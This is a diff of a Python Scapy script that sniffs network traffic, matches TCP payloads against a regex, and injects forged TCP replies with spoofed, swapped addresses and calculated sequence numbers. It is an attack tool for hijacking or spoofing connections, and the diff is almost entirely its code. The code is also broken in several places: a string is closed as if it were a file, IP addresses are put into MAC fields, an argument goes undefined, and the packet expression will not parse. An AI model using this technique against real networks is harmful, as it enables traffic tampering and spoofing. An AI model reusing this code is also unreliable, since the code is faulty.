@@ -13,7 +13,9 @@ def safe_close(signal, frame):
 signal.signal(signal.SIGINT, signal_handler)
 
 def inject_main(interface, regexp, datafile, exp):
-	response =.... 
+	response_file = open(args.datafile,'r')
+	response = response_file.read()
+	response.close()
 	regex_engine = re.compile(regexp)
 	sniff(
 		iface=interface,
@@ -22,11 +24,33 @@ def inject_main(interface, regexp, datafile, exp):
 		)
 
 def _process_packet(packet, regexp, response):
-	
-def _is_target_packet(packet):
+	if(_is_target_packet(packet, regex_engine)):
+		_inject_reply(packet, response)
+
+def _is_target_packet(packet, regex_engine):
 	#Apply the regex matching to the packet only if it is tcp
-def _inject_reply(packet, response):
-	
+	return re.search(regex_engine, packet[TCP][Raw].load)
+
+def _inject_reply(packet, response_payload):
+	loaded_response =  
+	Ether(
+		src		=	packet[IP].dst,
+		dst 	=	packet[IP].src
+		)
+	/ IP(
+		src 	=	packet[IP].dst,
+		dst 	=	packet[IP].src,
+		id 		=	packet[IP].id + 42
+		) 
+	/ TCP(
+		sport	=	packet[TCP].dport,
+		dport	=	packet[TCP].sport,
+		ack 	= 	packet[TCP].seq + len(packet[Raw]),
+		seq 	= 	packet[TCP].ack,
+		) 
+	/ response_payload
+
+	sendp(loaded_response)
 
 
 
